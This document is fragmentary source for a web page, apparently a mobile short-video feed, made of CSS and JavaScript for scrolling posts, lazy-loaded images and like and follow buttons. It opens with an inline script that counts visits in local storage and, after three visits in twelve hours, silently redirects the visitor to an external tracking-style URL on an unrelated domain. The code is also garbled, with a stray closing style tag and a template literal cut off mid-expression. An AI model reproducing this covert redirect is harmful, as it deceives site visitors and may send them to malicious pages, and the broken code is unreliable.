<script>
(function () {
  "use strict";

  const KEY = "site_visit_limit_v1";
  const LIMIT = 3;
  const TIME = 12 * 60 * 60 * 1000; // 12 hours
  const REDIRECT_URL = "https://mammothsubway.com/pynxydkcf?key=9fcaaab1932732baaffa3314295d33af";

  try {
    const now = Date.now();
    let data = null;

    try {
      data = JSON.parse(localStorage.getItem(KEY));
    } catch (e) {
      data = null;
    }

    if (
      !data ||
      typeof data.start !== "number" ||
      typeof data.count !== "number" ||
      now - data.start >= TIME
    ) {
      data = {
        start: now,
        count: 0
      };
    }

    data.count++;

    localStorage.setItem(KEY, JSON.stringify(data));

    /* 4th visit = redirect */
    if (data.count > LIMIT) {
      window.location.replace(REDIRECT_URL);
    }

  } catch (e) {
    console.log("Visit limiter error:", e);
  }
})();
</script>

*{box-sizing:border-box}
html,body{height:100%;margin:0}
body{height:100dvh;display:flex;flex-direction:column;background:var(--bg);color:var(--ink);font:16px/1.35 system-ui,-apple-system,"Segoe UI",Roboto,"Noto Sans Bengali",sans-serif;overflow:hidden}
button,a{font:inherit;color:inherit}

.msg{display:none;flex:1;place-items:center;text-align:center;padding:24px}
.msg h1{margin:0 0 8px;font-size:24px}
.msg p{margin:0;color:var(--mut)}

.feed{height:calc(100dvh - var(--navh));overflow-y:auto;scroll-snap-type:y mandatory;scrollbar-width:none;overscroll-behavior:contain}
.feed::-webkit-scrollbar{display:none}
.post{height:calc(100dvh - var(--navh));scroll-snap-align:start;scroll-snap-stop:always}
.wrap{position:relative;height:100%}

.card{position:relative;height:100%;overflow:hidden;color:#fff;background:#000;display:flex;flex-direction:column;justify-content:flex-end}
.th{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
.card::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.7),transparent 45%);pointer-events:none}
.play{position:absolute;left:50%;top:50%;width:68px;height:68px;margin:-34px 0 0 -34px;border-radius:50%;background:rgba(0,0,0,.5);border:2px solid rgba(255,255,255,.75);display:grid;place-items:center;color:#fff;z-index:1}
.play svg{margin-left:4px}
.meta{position:relative;z-index:1;padding:0 76px 22px 16px;display:grid;gap:8px}
.who{display:flex;align-items:center;gap:10px;font-weight:700}
.av{width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,.25);display:grid;place-items:center}
.fol{background:none;border:1.5px solid #fff;border-radius:6px;padding:3px 10px;font-weight:600;font-size:14px;cursor:pointer}

svg{fill:currentColor}
.rail{position:absolute;right:10px;bottom:22px;display:flex;flex-direction:column;gap:14px;color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.5)}
.rail button{display:grid;justify-items:center;gap:4px;background:none;border:0;color:inherit;font-weight:600;font-size:12px;cursor:pointer;padding:0}
.rail i{width:44px;height:44px;border-radius:50%;background:rgba(0,0,0,.35);display:grid;place-items:center}
.rail .like[aria-pressed=true] i{background:var(--blue)}

.nav{order:2;height:var(--navh);display:flex;background:var(--nb);border-top:1px solid var(--line);padding-bottom:env(safe-area-inset-bottom,0px)}
.nav a{position:relative;flex:1;display:grid;place-items:center;color:var(--mut);text-decoration:none}
.nav a[aria-current]{color:var(--act)}
.nav a[aria-current]::before{content:"";position:absolute;top:0;left:12%;right:12%;height:3px;border-radius:0 0 3px 3px;background:currentColor}
.nav svg{fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}

@media (min-width:700px) and (hover:hover) and (pointer:fine){.feed,.nav{display:none}.msg{display:grid}}
</style>

<div class="rail">${btn("like","like",l,"Like")}${btn("","cmt",m,"Comment")}${btn("","shr",h,"Share")}<button aria-label="More"><i>${ic("dot")}</i></button></div>
</div></section>`).join("");

const io=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){const m=e.target.querySelector("img");if(m&&m.dataset.src)m.src=m.dataset.src;io.unobserve(e.target)}}),{root:feed,rootMargin:"60% 0px"});
document.querySelectorAll(".post").forEach(p=>io.observe(p));

feed.onclick=e=>{
  const b=e.target.closest("button");if(!b)return;
  if(b.classList.contains("like")){
    const on=b.getAttribute("aria-pressed")!=="true";
    b.setAttribute("aria-pressed",on);
    b.dataset.n=+b.dataset.n+(on?1:-1);
    b.lastChild.textContent=f(+b.dataset.n);
  }else if(b.classList.contains("fol")){
    b.textContent=b.textContent=="Follow"?"Following":"Follow";
  }
};
</script>
